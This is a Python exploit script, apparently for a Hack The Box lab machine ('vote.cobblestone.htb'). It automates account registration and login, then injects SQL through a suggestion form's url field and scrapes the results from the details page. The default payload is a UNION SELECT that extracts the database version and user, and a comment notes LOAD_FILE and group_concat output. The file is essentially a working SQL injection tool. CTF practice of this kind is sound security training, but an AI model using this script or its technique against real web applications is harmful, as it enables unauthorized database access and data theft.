#!/usr/bin/env python3
"""HTTP client for vote.cobblestone.htb — register, login, suggest, trigger SQLi."""
import re
import sys
import requests

BASE = "http://vote.cobblestone.htb"
TARGET_IP = "10.129.122.97"
HOST = "vote.cobblestone.htb"


def session():
    s = requests.Session()
    s.headers["Host"] = HOST
    return s


def register(s, user, password, email=None):
    email = email or f"{user}@htb.local"
    r = s.post(
        f"http://{TARGET_IP}/register.php",
        data={
            "username": user,
            "first": user,
            "last": user,
            "email": email,
            "password": password,
        },
        allow_redirects=True,
    )
    return r


def login(s, user, password):
    r = s.post(
        f"http://{TARGET_IP}/login_verify.php",
        data={"username": user, "password": password, "submit-login": ""},
        allow_redirects=True,
    )
    return r


def suggest(s, url, name="testserver"):
    r = s.post(
        f"http://{TARGET_IP}/suggest.php",
        data={"url": url, "name": name},
        allow_redirects=True,
    )
    m = re.search(r"details\.php\?id=(\d+)", r.url)
    vid = m.group(1) if m else None
    return r, vid


def details(s, vote_id):
    r = s.get(f"http://{TARGET_IP}/details.php", params={"id": vote_id})
    return r.text


def sqli_query(s, payload, name="sqli"):
    """Submit payload via suggest, return details page HTML."""
    _, vid = suggest(s, payload, name=name)
    if not vid:
        raise RuntimeError(f"suggest failed for payload: {payload[:80]}")
    return details(s, vid), vid


def extract_field(html, col=1):
    """Pull text from suggestion display area."""
    # Results appear in page body after SQLi
    patterns = [
        rf'<td[^>]*>\s*({col})\s*</td>',
        r'<p class="[^"]*">\s*([^<]+)\s*</p>',
        r'<div[^>]*class="[^"]*suggestion[^"]*"[^>]*>([^<]+)',
    ]
    for p in patterns:
        m = re.search(p, html, re.I | re.S)
        if m:
            return m.group(1).strip()
    # Fallback: look for LOAD_FILE content or group_concat output
    m = re.search(r'<body[^>]*>(.*?)</body>', html, re.S | re.I)
    if m:
        text = re.sub(r"<[^>]+>", " ", m.group(1))
        text = re.sub(r"\s+", " ", text).strip()
        return text[:2000]
    return html[:2000]


if __name__ == "__main__":
    user = sys.argv[1] if len(sys.argv) > 1 else "pwner"
    pw = sys.argv[2] if len(sys.argv) > 2 else "Pwner123!"
    s = session()
    register(s, user, pw)
    login(s, user, pw)
    payload = sys.argv[3] if len(sys.argv) > 3 else "' UNION SELECT version(),user(),3,4,5;-- -"
    html, vid = sqli_query(s, payload)
    print(f"vote_id={vid}")
    print(extract_field(html))
